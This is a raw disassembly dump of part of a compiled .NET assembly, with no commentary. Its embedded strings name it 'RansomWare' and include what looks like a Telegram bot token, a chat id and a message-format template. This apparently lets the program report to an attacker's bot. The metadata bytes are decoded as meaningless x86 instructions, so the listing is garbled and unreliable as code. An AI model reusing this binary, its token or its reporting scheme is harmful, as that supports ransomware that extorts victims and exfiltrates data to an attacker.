  408ae5:	02 02                	add    (%edx),%al
  408ae7:	08 0e                	or     %cl,(%esi)
  408ae9:	0e                   	push   %cs
  408aea:	02 02                	add    (%edx),%al
  408aec:	05 15 12 7d 01       	add    $0x17d1215,%eax
  408af1:	0e                   	push   %cs
  408af2:	05 20 01 01 13       	add    $0x13010120,%eax
  408af7:	00 04 00             	add    %al,(%eax,%eax,1)
  408afa:	00 1d 0e 09 20 00    	add    %bl,0x20090e
  408b00:	15 11 80 81 01       	adc    $0x1818011,%eax
  408b05:	13 00                	adc    (%eax),%eax
  408b07:	06                   	push   %es
  408b08:	15 11 80 81 01       	adc    $0x1818011,%eax
  408b0d:	0e                   	push   %cs
  408b0e:	04 20                	add    $0x20,%al
  408b10:	00 13                	add    %dl,(%ebx)
  408b12:	00 05 20 02 08 08    	add    %al,0x8080220
  408b18:	08 03                	or     %al,(%ebx)
  408b1a:	20 00                	and    %al,(%eax)
  408b1c:	02 05 00 02 0e 0e    	add    0xe0e0200,%al
  408b22:	1c 0d                	sbb    $0xd,%al
  408b24:	10 01                	adc    %al,(%ecx)
  408b26:	02 15 12 81 11 01    	add    0x1118112,%dl
  408b2c:	1e                   	push   %ds
  408b2d:	00 1e                	add    %bl,(%esi)
  408b2f:	00 08                	add    %cl,(%eax)
  408b31:	03 0a                	add    (%edx),%ecx
  408b33:	01 0e                	add    %ecx,(%esi)
  408b35:	07                   	pop    %es
  408b36:	15 12 81 15 02       	adc    $0x2158112,%eax
  408b3b:	0e                   	push   %cs
  408b3c:	03 1a                	add    (%edx),%ebx
  408b3e:	10 02                	adc    %al,(%edx)
  408b40:	02 15 12 81 11 01    	add    0x1118112,%dl
  408b46:	1e                   	push   %ds
  408b47:	01 15 12 81 11 01    	add    %edx,0x1118112
  408b4d:	1e                   	push   %ds
  408b4e:	00 15 12 81 15 02    	add    %dl,0x2158112
  408b54:	1e                   	push   %ds
  408b55:	00 1e                	add    %bl,(%esi)
  408b57:	01 04 0a             	add    %eax,(%edx,%ecx,1)
  408b5a:	02 0e                	add    (%esi),%cl
  408b5c:	03 0d 10 01 01 1d    	add    0x1d010110,%ecx
  408b62:	1e                   	push   %ds
  408b63:	00 15 12 81 11 01    	add    %dl,0x1118112
  408b69:	1e                   	push   %ds
  408b6a:	00 03                	add    %al,(%ebx)
  408b6c:	0a 01                	or     (%ecx),%al
  408b6e:	03 05 20 01 01 1d    	add    0x1d010120,%eax
  408b74:	03 02                	add    (%edx),%eax
  408b76:	06                   	push   %es
  408b77:	0e                   	push   %cs
  408b78:	0d 07 05 12 5d       	or     $0x5d120507,%eax
  408b7d:	02 1d 12 80 85 08    	add    0x8858012,%bl
  408b83:	12 80 85 07 00 01    	adc    0x1000785(%eax),%al
  408b89:	1d 12 80 85 0e       	sbb    $0xe858012,%eax
  408b8e:	09 07                	or     %eax,(%edi)
  408b90:	03 0e                	add    (%esi),%ecx
  408b92:	12 80 89 12 80 8d    	adc    -0x727fed77(%eax),%al
  408b98:	05 20 02 01 08       	add    $0x8010220,%eax
  408b9d:	08 08                	or     %cl,(%eax)
  408b9f:	00 01                	add    %al,(%ecx)
  408ba1:	12 80 8d 12 81 19    	adc    0x1981128d(%eax),%al
  408ba7:	05 00 00 11 81       	add    $0x81110000,%eax
  408bac:	1d 06 20 01 01       	sbb    $0x1012006,%eax
  408bb1:	11 81 1d 05 00 00    	adc    %eax,0x51d(%ecx)
  408bb7:	12 81 21 07 20 02    	adc    0x2200721(%ecx),%al
  408bbd:	01 0e                	add    %ecx,(%esi)
  408bbf:	12 81 21 15 07 08    	adc    0x8071521(%ecx),%al
  408bc5:	12 5d 02             	adc    0x2(%ebp),%bl
  408bc8:	1d 12 80 85 08       	sbb    $0x8858012,%eax
  408bcd:	12 80 85 1d 12 80    	adc    -0x7fede27b(%eax),%al
  408bd3:	85 08                	test   %ecx,(%eax)
  408bd5:	12 80 85 07 07 02    	adc    0x2070785(%eax),%al
  408bdb:	12 61 12             	adc    0x12(%ecx),%ah
  408bde:	80 91 08 20 03 01 0e 	adcb   $0xe,0x1032008(%ecx)
  408be5:	0c 11                	or     $0x11,%al
  408be7:	81 31 06 20 01 01    	xorl   $0x1012006,(%ecx)
  408bed:	12 81 2d 06 20 01    	adc    0x120062d(%ecx),%al
  408bf3:	01 11                	add    %edx,(%ecx)
  408bf5:	81 35 06 20 01 01 11 	xorl   $0x5398111,0x1012006
  408bfc:	81 39 05 
  408bff:	20 00                	and    %al,(%eax)
  408c01:	12 81 3d 06 20 01    	adc    0x120063d(%ecx),%al
  408c07:	01 12                	add    %edx,(%edx)
  408c09:	81 29 05 20 00 11    	subl   $0x11002005,(%ecx)
  408c0f:	81 41 04 07 02 0e 0e 	addl   $0xe0e0207,0x4(%ecx)
  408c16:	05 00 00 12 81       	add    $0x81120000,%eax
  408c1b:	45                   	inc    %ebp
  408c1c:	06                   	push   %es
  408c1d:	00 02                	add    %al,(%edx)
  408c1f:	0e                   	push   %cs
  408c20:	0e                   	push   %cs
  408c21:	1d 1c 06 07 02       	sbb    $0x207061c,%eax
  408c26:	12 80 95 0e 0c 07    	adc    0x70c0e95(%eax),%al
  408c2c:	04 0e                	add    $0xe,%al
  408c2e:	12 80 89 11 80 99    	adc    -0x667fee77(%eax),%al
  408c34:	12 80 8d 05 00 00    	adc    0x58d(%eax),%al
  408c3a:	12 81 49 05 20 00    	adc    0x200549(%ecx),%al
  408c40:	11 80 99 03 20 00    	adc    %eax,0x200399(%eax)
  408c46:	08 05 20 00 11 81    	or     %al,0x81110020
  408c4c:	4d                   	dec    %ebp
  408c4d:	0a 20                	or     (%eax),%ah
  408c4f:	05 01 08 08 08       	add    $0x8080801,%eax
  408c54:	08 11                	or     %dl,(%ecx)
  408c56:	81 4d 04 00 01 01 0e 	orl    $0xe010100,0x4(%ebp)
  408c5d:	0d 07 03 0e 15       	or     $0x150e0307,%eax
  408c62:	12 08                	adc    (%eax),%cl
  408c64:	03 0e                	add    (%esi),%ecx
  408c66:	0e                   	push   %cs
  408c67:	0e                   	push   %cs
  408c68:	12 80 95 07 15 12    	adc    0x12150795(%eax),%al
  408c6e:	08 03                	or     %al,(%ebx)
  408c70:	0e                   	push   %cs
  408c71:	0e                   	push   %cs
  408c72:	0e                   	push   %cs
  408c73:	09 20                	or     %esp,(%eax)
  408c75:	03 01                	add    (%ecx),%eax
  408c77:	13 00                	adc    (%eax),%eax
  408c79:	13 01                	adc    (%ecx),%eax
  408c7b:	13 02                	adc    (%edx),%eax
  408c7d:	15 07 0a 0e 12       	adc    $0x120e0a07,%eax
  408c82:	80 95 0e 11 80 9d 12 	adcb   $0x12,-0x627feef2(%ebp)
  408c89:	80 a1 1d 05 1d 05 0e 	andb   $0xe,0x51d051d(%ecx)
  408c90:	1d 05 0e 05 00       	sbb    $0x50e05,%eax
  408c95:	00 11                	add    %dl,(%ecx)
  408c97:	80 9d 03 20 00 0a 05 	sbbb   $0x5,0xa002003(%ebp)
  408c9e:	20 00                	and    %al,(%eax)
  408ca0:	12 81 55 07 20 02    	adc    0x2200755(%ecx),%al
  408ca6:	01 11                	add    %edx,(%ecx)
  408ca8:	81 59 0e 05 00 00 12 	sbbl   $0x12000005,0xe(%ecx)
  408caf:	81 5d 05 20 01 1d 05 	sbbl   $0x51d0120,0x5(%ebp)
  408cb6:	0e                   	push   %cs
  408cb7:	07                   	pop    %es
  408cb8:	20 03                	and    %al,(%ebx)
  408cba:	01 1d 05 08 08 05    	add    %ebx,0x5080805
  408cc0:	00 01                	add    %al,(%ecx)
  408cc2:	1d 05 0e 04 20       	sbb    $0x20040e05,%eax
  408cc7:	00 1d 05 08 20 03    	add    %bl,0x3200805
  408ccd:	1d 05 0e 0e 1d       	sbb    $0x1d0e0e05,%eax
  408cd2:	05 05 07 01 12       	add    $0x12010705,%eax
  408cd7:	80 a5 06 20 01 01 11 	andb   $0x11,0x1012006(%ebp)
  408cde:	81 65 08 00 01 12 80 	andl   $0x80120100,0x8(%ebp)
  408ce5:	85 12                	test   %edx,(%edx)
  408ce7:	80 a5 04 07 01 12 75 	andb   $0x75,0x12010704(%ebp)
  408cee:	05 07 03 08 02       	add    $0x2080307,%eax
  408cf3:	02 05 00 02 01 08    	add    0x8010200,%al
  408cf9:	08 04 20             	or     %al,(%eax,%eiz,1)
  408cfc:	01 08                	add    %ecx,(%eax)
  408cfe:	08 04 20             	or     %al,(%eax,%eiz,1)
  408d01:	01 03                	add    %eax,(%ebx)
  408d03:	08 09                	or     %cl,(%ecx)
  408d05:	07                   	pop    %es
  408d06:	03 02                	add    (%edx),%eax
  408d08:	12 80 b5 12 80 b5    	adc    -0x4a7fed4b(%eax),%al
  408d0e:	08 00                	or     %al,(%eax)
  408d10:	01 12                	add    %edx,(%edx)
  408d12:	81 6d 11 81 71 05 20 	subl   $0x20057181,0x11(%ebp)
  408d19:	00 12                	add    %dl,(%edx)
  408d1b:	81 75 07 20 02 01 0e 	xorl   $0xe010220,0x7(%ebp)
  408d22:	12 81 75 05 07 01    	adc    0x1070575(%ecx),%al
  408d28:	12 80 b9 04 07 01    	adc    0x10704b9(%eax),%al
  408d2e:	12 18                	adc    (%eax),%bl
  408d30:	08 00                	or     %al,(%eax)
  408d32:	01 12                	add    %edx,(%edx)
  408d34:	81 79 12 81 79 06 07 	cmpl   $0x7067981,0x12(%ecx)
  408d3b:	02 11                	add    (%ecx),%dl
  408d3d:	80 99 02 08 b7 7a 5c 	sbbb   $0x5c,0x7ab70802(%ecx)
  408d44:	56                   	push   %esi
  408d45:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  408d48:	89 08                	mov    %ecx,(%eax)
  408d4a:	b0 3f                	mov    $0x3f,%al
  408d4c:	5f                   	pop    %edi
  408d4d:	7f 11                	jg     0x408d60
  408d4f:	d5 0a                	aad    $0xa
  408d51:	3a 04 00             	cmp    (%eax,%eax,1),%al
  408d54:	00 00                	add    %al,(%eax)
  408d56:	00 04 14             	add    %al,(%esp,%edx,1)
  408d59:	00 00                	add    %al,(%eax)
  408d5b:	00 04 01             	add    %al,(%ecx,%eax,1)
  408d5e:	00 00                	add    %al,(%eax)
  408d60:	00 04 02             	add    %al,(%edx,%eax,1)
  408d63:	00 00                	add    %al,(%eax)
  408d65:	00 5c 38 00          	add    %bl,0x0(%eax,%edi,1)
  408d69:	37                   	aaa
  408d6a:	00 34 00             	add    %dh,(%eax,%eax,1)
  408d6d:	36 00 36             	add    %dh,%ss:(%esi)
  408d70:	00 33                	add    %dh,(%ebx)
  408d72:	00 32                	add    %dh,(%edx)
  408d74:	00 33                	add    %dh,(%ebx)
  408d76:	00 34 00             	add    %dh,(%eax,%eax,1)
  408d79:	38 00                	cmp    %al,(%eax)
  408d7b:	3a 00                	cmp    (%eax),%al
  408d7d:	41                   	inc    %ecx
  408d7e:	00 41 00             	add    %al,0x0(%ecx)
  408d81:	48                   	dec    %eax
  408d82:	00 4e 00             	add    %cl,0x0(%esi)
  408d85:	63 00                	arpl   %eax,(%eax)
  408d87:	33 00                	xor    (%eax),%eax
  408d89:	75 00                	jne    0x408d8b
  408d8b:	79 00                	jns    0x408d8d
  408d8d:	74 00                	je     0x408d8f
  408d8f:	69 00 33 00 38 00    	imul   $0x380033,(%eax),%eax
  408d95:	6a 00                	push   $0x0
  408d97:	5a                   	pop    %edx
  408d98:	00 30                	add    %dh,(%eax)
  408d9a:	00 4d 00             	add    %cl,0x0(%ebp)
  408d9d:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  408da1:	39 00                	cmp    %eax,(%eax)
  408da3:	4d                   	dec    %ebp
  408da4:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  408da8:	00 71 00             	add    %dh,0x0(%ecx)
  408dab:	76 00                	jbe    0x408dad
  408dad:	65 00 4c 00 61       	add    %cl,%gs:0x61(%eax,%eax,1)
  408db2:	00 69 00             	add    %ch,0x0(%ecx)
  408db5:	59                   	pop    %ecx
  408db6:	00 62 00             	add    %ah,0x0(%edx)
  408db9:	77 00                	ja     0x408dbb
  408dbb:	71 00                	jno    0x408dbd
  408dbd:	73 00                	jae    0x408dbf
  408dbf:	5f                   	pop    %edi
  408dc0:	00 73 00             	add    %dh,0x0(%ebx)
  408dc3:	14 37                	adc    $0x37,%al
  408dc5:	00 34 00             	add    %dh,(%eax,%eax,1)
  408dc8:	37                   	aaa
  408dc9:	00 32                	add    %dh,(%edx)
  408dcb:	00 37                	add    %dh,(%edi)
  408dcd:	00 32                	add    %dh,(%edx)
  408dcf:	00 36                	add    %dh,(%esi)
  408dd1:	00 37                	add    %dh,(%edi)
  408dd3:	00 36                	add    %dh,(%esi)
  408dd5:	00 38                	add    %bh,(%eax)
  408dd7:	00 02                	add    %al,(%edx)
  408dd9:	06                   	push   %es
  408dda:	08 02                	or     %al,(%edx)
  408ddc:	06                   	push   %es
  408ddd:	09 03                	or     %eax,(%ebx)
  408ddf:	06                   	push   %es
  408de0:	12 65 04             	adc    0x4(%ebp),%ah
  408de3:	06                   	push   %es
  408de4:	12 80 b5 04 06 12    	adc    0x120604b5(%eax),%al
  408dea:	80 b9 03 06 12 18 03 	cmpb   $0x3,0x18120603(%ecx)
  408df1:	06                   	push   %es
  408df2:	12 1c 04             	adc    (%esp,%eax,1),%bl
  408df5:	06                   	push   %es
  408df6:	12 80 a9 04 20 00    	adc    0x2004a9(%eax),%al
  408dfc:	13 01                	adc    (%ecx),%eax
  408dfe:	04 20                	add    $0x20,%al
  408e00:	00 13                	add    %dl,(%ebx)
  408e02:	02 04 20             	add    (%eax,%eiz,1),%al
  408e05:	01 02                	add    %eax,(%edx)
  408e07:	1c 03                	sbb    $0x3,%al
  408e09:	00 00                	add    %al,(%eax)
  408e0b:	18 05 00 02 02 18    	sbb    %al,0x18020200
  408e11:	08 03                	or     %al,(%ebx)
  408e13:	00 00                	add    %al,(%eax)
  408e15:	02 04 00             	add    (%eax,%eax,1),%al
  408e18:	01 02                	add    %eax,(%edx)
  408e1a:	02 04 00             	add    (%eax,%eax,1),%al
  408e1d:	01 08                	add    %ecx,(%eax)
  408e1f:	02 05 00 02 02 08    	add    0x8020200,%al
  408e25:	08 07                	or     %al,(%edi)
  408e27:	00 04 02             	add    %al,(%edx,%eax,1)
  408e2a:	09 09                	or     %ecx,(%ecx)
  408e2c:	0e                   	push   %cs
  408e2d:	09 04 00             	or     %eax,(%eax,%eax,1)
  408e30:	01 02                	add    %eax,(%edx)
  408e32:	09 04 20             	or     %eax,(%eax,%eiz,1)
  408e35:	01 0e                	add    %ecx,(%esi)
  408e37:	08 04 20             	or     %al,(%eax,%eiz,1)
  408e3a:	01 03                	add    %eax,(%ebx)
  408e3c:	0e                   	push   %cs
  408e3d:	05 00 00 12 80       	add    $0x80120000,%eax
  408e42:	b5 05                	mov    $0x5,%ch
  408e44:	00 00                	add    %al,(%eax)
  408e46:	12 80 b9 06 00 01    	adc    0x10006b9(%eax),%al
  408e4c:	01 12                	add    %edx,(%edx)
  408e4e:	80 b9 04 00 00 12 18 	cmpb   $0x18,0x12000004(%ecx)
  408e55:	04 28                	add    $0x28,%al
  408e57:	00 13                	add    %dl,(%ebx)
  408e59:	00 04 28             	add    %al,(%eax,%ebp,1)
  408e5c:	00 13                	add    %dl,(%ebx)
  408e5e:	01 04 28             	add    %eax,(%eax,%ebp,1)
  408e61:	00 13                	add    %dl,(%ebx)
  408e63:	02 05 08 00 12 80    	add    0x80120008,%al
  408e69:	b5 05                	mov    $0x5,%ch
  408e6b:	08 00                	or     %al,(%eax)
  408e6d:	12 80 b9 04 08 00    	adc    0x804b9(%eax),%al
  408e73:	12 18                	adc    (%eax),%bl
  408e75:	08 01                	or     %al,(%ecx)
  408e77:	00 08                	add    %cl,(%eax)
  408e79:	00 00                	add    %al,(%eax)
  408e7b:	00 00                	add    %al,(%eax)
  408e7d:	00 1e                	add    %bl,(%esi)
  408e7f:	01 00                	add    %eax,(%eax)
  408e81:	01 00                	add    %eax,(%eax)
  408e83:	54                   	push   %esp
  408e84:	02 16                	add    (%esi),%dl
  408e86:	57                   	push   %edi
  408e87:	72 61                	jb     0x408eea
  408e89:	70 4e                	jo     0x408ed9
  408e8b:	6f                   	outsl  %ds:(%esi),(%dx)
  408e8c:	6e                   	outsb  %ds:(%esi),(%dx)
  408e8d:	45                   	inc    %ebp
  408e8e:	78 63                	js     0x408ef3
  408e90:	65 70 74             	gs jo  0x408f07
  408e93:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  408e9a:	77 73                	ja     0x408f0f
  408e9c:	01 08                	add    %ecx,(%eax)
  408e9e:	01 00                	add    %eax,(%eax)
  408ea0:	07                   	pop    %es
  408ea1:	01 00                	add    %eax,(%eax)
  408ea3:	00 00                	add    %al,(%eax)
  408ea5:	00 0f                	add    %cl,(%edi)
  408ea7:	01 00                	add    %eax,(%eax)
  408ea9:	0a 52 61             	or     0x61(%edx),%dl
  408eac:	6e                   	outsb  %ds:(%esi),(%dx)
  408ead:	73 6f                	jae    0x408f1e
  408eaf:	6d                   	insl   (%dx),%es:(%edi)
  408eb0:	57                   	push   %edi
  408eb1:	61                   	popa
  408eb2:	72 65                	jb     0x408f19
  408eb4:	00 00                	add    %al,(%eax)
  408eb6:	05 01 00 00 00       	add    $0x1,%eax
  408ebb:	00 17                	add    %dl,(%edi)
  408ebd:	01 00                	add    %eax,(%eax)
  408ebf:	12 43 6f             	adc    0x6f(%ebx),%al
  408ec2:	70 79                	jo     0x408f3d
  408ec4:	72 69                	jb     0x408f2f
  408ec6:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  408ecc:	20 20                	and    %ah,(%eax)
  408ece:	32 30                	xor    (%eax),%dh
  408ed0:	32 36                	xor    (%esi),%dh
  408ed2:	00 00                	add    %al,(%eax)
  408ed4:	29 01                	sub    %eax,(%ecx)
  408ed6:	00 24 30             	add    %ah,(%eax,%esi,1)
  408ed9:	63 38                	arpl   %edi,(%eax)
  408edb:	65 38 63 32          	cmp    %ah,%gs:0x32(%ebx)
  408edf:	34 2d                	xor    $0x2d,%al
  408ee1:	30 35 64 65 2d 34    	xor    %dh,0x342d6564
  408ee7:	34 39                	xor    $0x39,%al
  408ee9:	39 2d 62 36 62 64    	cmp    %ebp,0x64623662
  408eef:	2d 62 65 65 62       	sub    $0x62656562,%eax
  408ef4:	30 63 32             	xor    %ah,0x32(%ebx)
  408ef7:	32 36                	xor    (%esi),%dh
  408ef9:	30 39                	xor    %bh,(%ecx)
  408efb:	37                   	aaa
  408efc:	00 00                	add    %al,(%eax)
  408efe:	0c 01                	or     $0x1,%al
  408f00:	00 07                	add    %al,(%edi)
  408f02:	31 2e                	xor    %ebp,(%esi)
  408f04:	30 2e                	xor    %ch,(%esi)
  408f06:	30 2e                	xor    %ch,(%esi)
  408f08:	30 00                	xor    %al,(%eax)
  408f0a:	00 49 01             	add    %cl,0x1(%ecx)
  408f0d:	00 1a                	add    %bl,(%edx)
  408f0f:	2e 4e                	cs dec %esi
  408f11:	45                   	inc    %ebp
  408f12:	54                   	push   %esp
  408f13:	46                   	inc    %esi
  408f14:	72 61                	jb     0x408f77
  408f16:	6d                   	insl   (%dx),%es:(%edi)
  408f17:	65 77 6f             	gs ja  0x408f89
  408f1a:	72 6b                	jb     0x408f87
  408f1c:	2c 56                	sub    $0x56,%al
  408f1e:	65 72 73             	gs jb  0x408f94
  408f21:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  408f28:	38 01                	cmp    %al,(%ecx)
  408f2a:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  408f2e:	46                   	inc    %esi
  408f2f:	72 61                	jb     0x408f92
  408f31:	6d                   	insl   (%dx),%es:(%edi)
  408f32:	65 77 6f             	gs ja  0x408fa4
  408f35:	72 6b                	jb     0x408fa2
  408f37:	44                   	inc    %esp
  408f38:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  408f3f:	61                   	popa
  408f40:	6d                   	insl   (%dx),%es:(%edi)
  408f41:	65 12 2e             	adc    %gs:(%esi),%ch
  408f44:	4e                   	dec    %esi
  408f45:	45                   	inc    %ebp
  408f46:	54                   	push   %esp
  408f47:	20 46 72             	and    %al,0x72(%esi)
  408f4a:	61                   	popa
  408f4b:	6d                   	insl   (%dx),%es:(%edi)
  408f4c:	65 77 6f             	gs ja  0x408fbe
  408f4f:	72 6b                	jb     0x408fbc
  408f51:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  408f54:	38 08                	cmp    %cl,(%eax)
  408f56:	01 00                	add    %eax,(%eax)
  408f58:	00 00                	add    %al,(%eax)
  408f5a:	00 00                	add    %al,(%eax)
  408f5c:	00 00                	add    %al,(%eax)
  408f5e:	5f                   	pop    %edi
  408f5f:	01 00                	add    %eax,(%eax)
  408f61:	42                   	inc    %edx
  408f62:	5c                   	pop    %esp
  408f63:	7b 20                	jnp    0x408f85
  408f65:	63 68 61             	arpl   %ebp,0x61(%eax)
  408f68:	74 5f                	je     0x408fc9
  408f6a:	69 64 20 3d 20 7b 63 	imul   $0x68637b20,0x3d(%eax,%eiz,1),%esp
  408f71:	68 
  408f72:	61                   	popa
  408f73:	74 5f                	je     0x408fd4
  408f75:	69 64 7d 2c 20 74 65 	imul   $0x78657420,0x2c(%ebp,%edi,2),%esp
  408f7c:	78 
  408f7d:	74 20                	je     0x408f9f
  408f7f:	3d 20 7b 74 65       	cmp    $0x65747b20,%eax
  408f84:	78 74                	js     0x408ffa
  408f86:	7d 2c                	jge    0x408fb4
  408f88:	20 70 61             	and    %dh,0x61(%eax)
  408f8b:	72 73                	jb     0x409000
  408f8d:	65 5f                	gs pop %edi
  408f8f:	6d                   	insl   (%dx),%es:(%edi)
  408f90:	6f                   	outsl  %ds:(%esi),(%dx)
  408f91:	64 65 20 3d 20 7b 70 	fs and %bh,%gs:0x61707b20
  408f98:	61 
  408f99:	72 73                	jb     0x40900e
  408f9b:	65 5f                	gs pop %edi
  408f9d:	6d                   	insl   (%dx),%es:(%edi)
  408f9e:	6f                   	outsl  %ds:(%esi),(%dx)
  408f9f:	64 65 7d 20          	fs gs jge 0x408fc3
  408fa3:	7d 01                	jge    0x408fa6
  408fa5:	00 54 0e 04          	add    %dl,0x4(%esi,%ecx,1)
  408fa9:	54                   	push   %esp
  408faa:	79 70                	jns    0x40901c
  408fac:	65 10 3c 41          	adc    %bh,%gs:(%ecx,%eax,2)
  408fb0:	6e                   	outsb  %ds:(%esi),(%dx)
  408fb1:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb2:	6e                   	outsb  %ds:(%esi),(%dx)
  408fb3:	79 6d                	jns    0x409022
  408fb5:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb6:	75 73                	jne    0x40902b
  408fb8:	20 54 79 70          	and    %dl,0x70(%ecx,%edi,2)
  408fbc:	65 3e 40             	gs ds inc %eax
  408fbf:	01 00                	add    %eax,(%eax)
  408fc1:	33 53 79             	xor    0x79(%ebx),%edx
  408fc4:	73 74                	jae    0x40903a
  408fc6:	65 6d                	gs insl (%dx),%es:(%edi)
  408fc8:	2e 52                	cs push %edx
  408fca:	65 73 6f             	gs jae 0x40903c
  408fcd:	75 72                	jne    0x409041
  408fcf:	63 65 73             	arpl   %esp,0x73(%ebp)
  408fd2:	2e 54                	cs push %esp
  408fd4:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd5:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd6:	6c                   	insb   (%dx),%es:(%edi)
  408fd7:	73 2e                	jae    0x409007
  408fd9:	53                   	push   %ebx
  408fda:	74 72                	je     0x40904e
  408fdc:	6f                   	outsl  %ds:(%esi),(%dx)
  408fdd:	6e                   	outsb  %ds:(%esi),(%dx)
  408fde:	67 6c                	insb   (%dx),%es:(%di)
  408fe0:	79 54                	jns    0x409036
  408fe2:	79 70                	jns    0x409054
  408fe4:	65 64 52             	gs fs push %edx
  408fe7:	65 73 6f             	gs jae 0x409059
  408fea:	75 72                	jne    0x40905e
  408fec:	63 65 42             	arpl   %esp,0x42(%ebp)
  408fef:	75 69                	jne    0x40905a
  408ff1:	6c                   	insb   (%dx),%es:(%edi)
  408ff2:	64 65 72 07          	fs gs jb 0x408ffd
  408ff6:	34 2e                	xor    $0x2e,%al
  408ff8:	30 2e                	xor    %ch,(%esi)
  408ffa:	30 2e                	xor    %ch,(%esi)
  408ffc:	30 00                	xor    %al,(%eax)
  408ffe:	00 59 01             	add    %bl,0x1(%ecx)
  409001:	00 4b 4d             	add    %cl,0x4d(%ebx)
  409004:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40900b:	74 2e                	je     0x40903b
  40900d:	56                   	push   %esi
  40900e:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  409015:	75 64                	jne    0x40907b
  409017:	69 6f 2e 45 64 69 74 	imul   $0x74696445,0x2e(%edi),%ebp
  40901e:	6f                   	outsl  %ds:(%esi),(%dx)
  40901f:	72 73                	jb     0x409094
  409021:	2e 53                	cs push %ebx
  409023:	65 74 74             	gs je  0x40909a
  409026:	69 6e 67 73 44 65 73 	imul   $0x73654473,0x67(%esi),%ebp
  40902d:	69 67 6e 65 72 2e 53 	imul   $0x532e7265,0x6e(%edi),%esp
  409034:	65 74 74             	gs je  0x4090ab
  409037:	69 6e 67 73 53 69 6e 	imul   $0x6e695373,0x67(%esi),%ebp
  40903e:	67 6c                	insb   (%dx),%es:(%di)
  409040:	65 46                	gs inc %esi
  409042:	69 6c 65 47 65 6e 65 	imul   $0x72656e65,0x47(%ebp,%eiz,2),%ebp
  409049:	72 
  40904a:	61                   	popa
  40904b:	74 6f                	je     0x4090bc
  40904d:	72 08                	jb     0x409057
  40904f:	31 31                	xor    %esi,(%ecx)
  409051:	2e 30 2e             	xor    %ch,%cs:(%esi)
  409054:	30 2e                	xor    %ch,(%esi)
  409056:	30 00                	xor    %al,(%eax)
  409058:	00 08                	add    %cl,(%eax)
  40905a:	01 00                	add    %eax,(%eax)
  40905c:	02 00                	add    (%eax),%al
  40905e:	00 00                	add    %al,(%eax)
  409060:	00 00                	add    %al,(%eax)
  409062:	00 00                	add    %al,(%eax)
  409064:	b4 00                	mov    $0x0,%ah
  409066:	00 00                	add    %al,(%eax)
  409068:	ce                   	into
  409069:	ca ef be             	lret   $0xbeef
  40906c:	01 00                	add    %eax,(%eax)
  40906e:	00 00                	add    %al,(%eax)
  409070:	91                   	xchg   %eax,%ecx
  409071:	00 00                	add    %al,(%eax)
  409073:	00 6c 53 79          	add    %ch,0x79(%ebx,%edx,2)
  409077:	73 74                	jae    0x4090ed
  409079:	65 6d                	gs insl (%dx),%es:(%edi)
  40907b:	2e 52                	cs push %edx
  40907d:	65 73 6f             	gs jae 0x4090ef
  409080:	75 72                	jne    0x4090f4
  409082:	63 65 73             	arpl   %esp,0x73(%ebp)
  409085:	2e 52                	cs push %edx
  409087:	65 73 6f             	gs jae 0x4090f9
  40908a:	75 72                	jne    0x4090fe
  40908c:	63 65 52             	arpl   %esp,0x52(%ebp)
  40908f:	65 61                	gs popa
  409091:	64 65 72 2c          	fs gs jb 0x4090c1
  409095:	20 6d 73             	and    %ch,0x73(%ebp)
  409098:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40909b:	6c                   	insb   (%dx),%es:(%edi)
  40909c:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  4090a3:	73 69                	jae    0x40910e
  4090a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4090a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4090a7:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  4090ac:	30 2e                	xor    %ch,(%esi)
  4090ae:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  4090b1:	43                   	inc    %ebx
  4090b2:	75 6c                	jne    0x409120
  4090b4:	74 75                	je     0x40912b
  4090b6:	72 65                	jb     0x40911d
  4090b8:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  4090bd:	72 61                	jb     0x409120
  4090bf:	6c                   	insb   (%dx),%es:(%edi)
  4090c0:	2c 20                	sub    $0x20,%al
  4090c2:	50                   	push   %eax
  4090c3:	75 62                	jne    0x409127
  4090c5:	6c                   	insb   (%dx),%es:(%edi)
  4090c6:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  4090cd:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  4090d1:	62 37                	bound  %esi,(%edi)
  4090d3:	37                   	aaa
  4090d4:	61                   	popa
  4090d5:	35 63 35 36 31       	xor    $0x31363563,%eax
  4090da:	39 33                	cmp    %esi,(%ebx)
  4090dc:	34 65                	xor    $0x65,%al
  4090de:	30 38                	xor    %bh,(%eax)
  4090e0:	39 23                	cmp    %esp,(%ebx)
  4090e2:	53                   	push   %ebx
  4090e3:	79 73                	jns    0x409158
  4090e5:	74 65                	je     0x40914c
  4090e7:	6d                   	insl   (%dx),%es:(%edi)
  4090e8:	2e 52                	cs push %edx
  4090ea:	65 73 6f             	gs jae 0x40915c
  4090ed:	75 72                	jne    0x409161
  4090ef:	63 65 73             	arpl   %esp,0x73(%ebp)
  4090f2:	2e 52                	cs push %edx
  4090f4:	75 6e                	jne    0x409164
  4090f6:	74 69                	je     0x409161
  4090f8:	6d                   	insl   (%dx),%es:(%edi)
  4090f9:	65 52                	gs push %edx
  4090fb:	65 73 6f             	gs jae 0x40916d
  4090fe:	75 72                	jne    0x409172
  409100:	63 65 53             	arpl   %esp,0x53(%ebp)
  409103:	65 74 02             	gs je  0x409108
	...
  40910e:	00 00                	add    %al,(%eax)
